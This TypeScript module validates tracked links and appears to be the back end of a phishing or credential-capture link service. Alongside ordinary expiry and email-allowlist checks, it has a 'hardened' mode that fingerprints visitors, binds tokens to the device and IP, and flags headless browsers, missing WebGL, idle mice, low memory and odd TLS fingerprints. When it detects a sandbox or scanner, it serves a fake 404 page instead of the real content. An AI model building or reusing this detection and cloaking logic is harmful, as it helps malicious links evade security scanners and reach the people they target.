/**
 * LINK VALIDATION - Business Logic & Security Checks
 * 
 * Handles ALL business rules and security validation for links.
 * Clean layer between linkManager and database.
 * 
 * Supports two security modes:
 * - strict: Standard validation (default)
 * - hardened: Red-team mode with advanced security checks
 * 
 * Follows: /PROJECT_ARCHITECTURE/LINK_ENGINE_BLUEPRINT.md
 */

import { getSecurityMode, getCachedSecurityMode } from './adminSettings'
import { getLinkByToken, getLinkById, type LinkRecord } from './linkDatabaseSql'
import { decryptToken, type TokenPayload, InvalidTokenError } from './tokenEngine'
import crypto from 'crypto'

// ============================================
// Type Definitions
// ============================================

/**
 * Security context for validation
 */
export interface SecurityContext {
  fingerprint?: string
  ip?: string
  userAgent?: string
  asn?: string
  continent?: string
  region?: string
  browserFamily?: string
  timestamp?: number
  canvasHash?: string
  webglHash?: string
  audioHash?: string
  memory?: number
  hardwareConcurrency?: number
  screenResolution?: string
  timezone?: string
  language?: string
  mouseEvents?: number
  scrollEvents?: number
  focusBlurDelta?: number
  ja3Hash?: string
  [key: string]: any
}

/**
 * Validation result
 */
export interface ValidationResult {
  valid: boolean
  reason?: string
  shouldCloak?: boolean // If true, return cloaked response instead of error
}

/**
 * Anti-sandbox detection result
 */
export interface SandboxDetection {
  detected: boolean
  reasons: string[]
}

// ============================================
// Core Validation Functions
// ============================================

/**
 * Check if a link can be used
 * 
 * @param token Link token
 * @param email Email address (for Type A links)
 * @param context Security context
 * @returns Validation result
 */
export async function canUseLink(
  token: string,
  email?: string,
  context?: SecurityContext
): Promise<ValidationResult> {
  try {
    const securityMode = await getSecurityMode()
    
    // Basic validation (both modes)
    const link = await getLinkByToken(token)
    if (!link) {
      return { valid: false, reason: 'Link not found' }
    }
    
    // Check expiration
    if (isExpired(link)) {
      return { valid: false, reason: 'Link expired' }
    }
    
    // Check if already used (Type A only)
    if (link.type === 'personalized' && isUsed(link)) {
      return { valid: false, reason: 'Link already used' }
    }
    
    // Hardened mode checks
    if (securityMode === 'hardened' && context) {
      // Token binding validation
      const bindingCheck = await validateTokenBinding(token, context)
      if (!bindingCheck.valid) {
        return { valid: false, reason: bindingCheck.reason, shouldCloak: true }
      }
      
      // Millisecond-window expiry check
      const expiryCheck = await validateMillisecondExpiry(token)
      if (!expiryCheck.valid) {
        return { valid: false, reason: expiryCheck.reason, shouldCloak: true }
      }
      
      // Anti-sandbox detection
      const sandboxCheck = detectSandbox(context)
      if (sandboxCheck.detected) {
        return { 
          valid: false, 
          reason: `Sandbox detected: ${sandboxCheck.reasons.join(', ')}`, 
          shouldCloak: true 
        }
      }
      
      // Security anomaly detection
      const anomalyCheck = securityAnomalyDetected(link, context)
      if (anomalyCheck.detected) {
        return { 
          valid: false, 
          reason: `Anomaly detected: ${anomalyCheck.reasons.join(', ')}`, 
          shouldCloak: true 
        }
      }
    }
    
    // Email validation (if provided)
    if (email) {
      const emailCheck = await isEmailAllowed(link, email)
      if (!emailCheck) {
        return { valid: false, reason: 'Email not allowed for this link' }
      }
      
      // Check if email already captured (Type B)
      if (link.type === 'generic') {
        const capturedCheck = await hasEmailCapturedBefore(token, email)
        if (capturedCheck) {
          return { valid: false, reason: 'Email already used this link' }
        }
      }
    }
    
    return { valid: true }
  } catch (error) {
    const securityMode = await getSecurityMode()
    // In hardened mode, cloak errors
    if (securityMode === 'hardened') {
      return { valid: false, reason: 'Validation failed', shouldCloak: true }
    }
    return { valid: false, reason: error instanceof Error ? error.message : 'Validation failed' }
  }
}

/**
 * Check if link is expired
 * 
 * @param link Link record
 * @returns true if expired
 */
export function isExpired(link: LinkRecord): boolean {
  const now = Math.floor(Date.now() / 1000) // Unix timestamp in seconds
  return link.expires_at < now
}

/**
 * Check if link is used (Type A only)
 * 
 * @param link Link record
 * @returns true if used
 */
export function isUsed(link: LinkRecord): boolean {
  return link.used === 1 || link.status === 'used'
}

/**
 * Check if email is allowed for link
 * 
 * @param link Link record
 * @param email Email address
 * @returns true if allowed
 */
export async function isEmailAllowed(link: LinkRecord, email: string): Promise<boolean> {
  if (link.type === 'personalized') {
    // Type A: email must match exactly
    return link.email?.toLowerCase() === email.toLowerCase()
  } else {
    // Type B: check allowlist
    const { getEmailAllowlists } = await import('./linkDatabaseSql')
    const allowlists = await getEmailAllowlists(link.id)
    return allowlists.some(a => a.email.toLowerCase() === email.toLowerCase())
  }
}

/**
 * Check if email was captured before (Type B)
 * 
 * @param token Link token
 * @param email Email address
 * @returns true if already captured
 */
export async function hasEmailCapturedBefore(token: string, email: string): Promise<boolean> {
  const link = await getLinkByToken(token)
  if (!link || link.type !== 'generic') {
    return false
  }
  
  const { getEmailAllowlists } = await import('./linkDatabaseSql')
  const allowlists = await getEmailAllowlists(link.id)
  const entry = allowlists.find(a => 
    a.email.toLowerCase() === email.toLowerCase() && a.captured === 1
  )
  
  return !!entry
}

/**
 * Determine if request should be rejected
 * 
 * @param token Link token
 * @param context Security context
 * @returns Validation result
 */
export async function shouldReject(
  token: string,
  context?: SecurityContext
): Promise<ValidationResult> {
  const securityMode = await getSecurityMode()
  
  // In strict mode, only basic checks
  if (securityMode === 'strict') {
    const link = await getLinkByToken(token)
    if (!link) {
      return { valid: false, reason: 'Link not found' }
    }
    if (isExpired(link)) {
      return { valid: false, reason: 'Link expired' }
    }
    return { valid: true }
  }
  
  // Hardened mode: comprehensive checks
  return await canUseLink(token, undefined, context)
}

// ============================================
// Hardened Mode Security Functions
// ============================================

/**
 * Validate token binding (fingerprint, IP ASN, user-agent)
 * Only runs in hardened mode
 * 
 * @param token Link token
 * @param context Security context
 * @returns Validation result
 */
async function validateTokenBinding(
  token: string,
  context: SecurityContext
): Promise<ValidationResult> {
  try {
    // Decrypt token to get binding data
    const payload = decryptToken(token)
    
    // Type guard: Check if it's v3 payload (has 'version' property)
    if ('version' in payload && payload.version === 3) {
      // v3 tokens use device binding (handled in decryptTokenV3)
      // This function is for v1/v2 tokens only
      return { valid: true }
    }
    
    // v1/v2 token binding checks
    const v1v2Payload = payload as any // Type assertion for v1/v2 payload
    
    // Check fingerprint binding
    if (v1v2Payload.fingerprintHash && context.fingerprint) {
      const currentFpHash = crypto.createHash('sha256').update(context.fingerprint).digest('hex')
      if (v1v2Payload.fingerprintHash !== currentFpHash) {
        return { valid: false, reason: 'Fingerprint mismatch' }
      }
    }
    
    // Check IP ASN + continent + region binding
    if (v1v2Payload.ipBinding && context.ip) {
      const currentIpHash = crypto.createHash('sha256')
        .update(`${context.ip}|${context.asn || ''}|${context.continent || ''}|${context.region || ''}`)
        .digest('hex')
      if (v1v2Payload.ipBinding !== currentIpHash) {
        return { valid: false, reason: 'IP/ASN/Region mismatch' }
      }
    }
    
    // Check user-agent family binding
    if (v1v2Payload.uaFamily && context.browserFamily) {
      if (v1v2Payload.uaFamily !== context.browserFamily) {
        return { valid: false, reason: 'User-agent family mismatch' }
      }
    }
    
    return { valid: true }
  } catch (error) {
    return { valid: false, reason: 'Token binding validation failed' }
  }
}

/**
 * Validate millisecond-window expiry
 * Only runs in hardened mode
 * 
 * @param token Link token
 * @returns Validation result
 */
async function validateMillisecondExpiry(token: string): Promise<ValidationResult> {
  try {
    const payload = decryptToken(token)
    
    // Type guard: Check if it's v3 payload (has 'version' property)
    if ('version' in payload && payload.version === 3) {
      // v3 tokens use issuedAt (seconds) - handled in decryptTokenV3
      // This function is for v1/v2 tokens only
      return { valid: true }
    }
    
    // v1/v2 token millisecond expiry check
    const v1v2Payload = payload as any // Type assertion for v1/v2 payload
    
    // Check if payload has timestamp
    if (v1v2Payload.ts && typeof v1v2Payload.ts === 'number') {
      const now = Date.now()
      const age = now - v1v2Payload.ts
      
      // Reject if older than 4,000ms (4 seconds)
      if (age > 4000) {
        return { valid: false, reason: 'Token expired (millisecond window)' }
      }
    }
    
    return { valid: true }
  } catch (error) {
    return { valid: false, reason: 'Millisecond expiry validation failed' }
  }
}

/**
 * Detect sandbox environments
 * Only runs in hardened mode
 * 
 * @param context Security context
 * @returns Sandbox detection result
 */
export function detectSandbox(context: SecurityContext): SandboxDetection {
  const reasons: string[] = []
  
  // Check for headless Chrome
  if (context.userAgent?.includes('HeadlessChrome')) {
    reasons.push('Headless Chrome detected')
  }
  
  // Check for no GPU / null renderer
  if (context.webglHash === 'null' || !context.webglHash) {
    reasons.push('No WebGL renderer')
  }
  
  // Check for no mouse movement (500ms+)
  if (context.mouseEvents === 0 && context.timestamp) {
    const timeSinceLoad = Date.now() - (context.timestamp || 0)
    if (timeSinceLoad > 500) {
      reasons.push('No mouse movement detected')
    }
  }
  
  // Check for perfect scroll increments (bot pattern)
  if (context.scrollEvents && context.scrollEvents > 0) {
    // This would need more context to detect perfect increments
    // For now, we check if scroll events are suspiciously uniform
  }
  
  // Check for stalled focus
  if (context.focusBlurDelta === 0 && context.timestamp) {
    const timeSinceLoad = Date.now() - (context.timestamp || 0)
    if (timeSinceLoad > 1000) {
      reasons.push('Stalled focus/blur events')
    }
  }
  
  // Check timezone mismatch
  if (context.timezone) {
    const validTimezones = [
      'America/New_York', 'America/Los_Angeles', 'Europe/London',
      'Europe/Paris', 'Asia/Tokyo', 'Asia/Shanghai', 'Australia/Sydney'
    ]
    // This is a simplified check - in production, validate against expected timezones
  }
  
  // Check UTC offset unrealistic
  if (context.timezone) {
    try {
      const offset = new Date().getTimezoneOffset()
      // Unrealistic offsets (e.g., > 14 hours or < -12 hours) might indicate sandbox
      if (Math.abs(offset) > 840) { // 14 hours in minutes
        reasons.push('Unrealistic UTC offset')
      }
    } catch {
      // Ignore
    }
  }
  
  // Check language/header mismatch
  if (context.language && context.userAgent) {
    // Simplified check - in production, validate language matches Accept-Language header
  }
  
  // Check memory < 128MB (sandbox indicator)
  if (context.memory && context.memory < 128 * 1024 * 1024) {
    reasons.push('Low memory detected (< 128MB)')
  }
  
  return {
    detected: reasons.length > 0,
    reasons
  }
}

/**
 * Detect security anomalies
 * Only runs in hardened mode
 * 
 * @param link Link record
 * @param context Security context
 * @returns Detection result
 */
export function securityAnomalyDetected(
  link: LinkRecord,
  context: SecurityContext
): SandboxDetection {
  const reasons: string[] = []
  
  // Check JA3/TLS fingerprint if available
  if (context.ja3Hash) {
    // In production, compare against known good profiles
    // For now, we just check if it's missing or suspicious
    if (context.ja3Hash === 'unknown' || context.ja3Hash.length < 32) {
      reasons.push('Suspicious JA3/TLS fingerprint')
    }
  }
  
  // Check entropy quality
  if (context.canvasHash && context.canvasHash.length < 16) {
    reasons.push('Low canvas entropy')
  }
  
  if (context.webglHash && context.webglHash.length < 16) {
    reasons.push('Low WebGL entropy')
  }
  
  if (context.audioHash && context.audioHash.length < 16) {
    reasons.push('Low audio entropy')
  }
  
  // Check for missing critical fingerprint data
  if (!context.fingerprint || context.fingerprint.length < 32) {
    reasons.push('Insufficient fingerprint data')
  }
  
  return {
    detected: reasons.length > 0,
    reasons
  }
}

// ============================================
// Cloaking Response Generator
// ============================================

/**
 * Generate cloaked response HTML
 * Returns harmless fake page instead of error
 * 
 * @returns HTML string
 */
export function generateCloakedResponse(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Not Found</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: #f5f5f5;
    }
    .container {
      text-align: center;
      padding: 2rem;
    }
    h1 { color: #333; margin-bottom: 1rem; }
    p { color: #666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>404 - Page Not Found</h1>
    <p>The page you are looking for does not exist.</p>
  </div>
</body>
</html>`
}

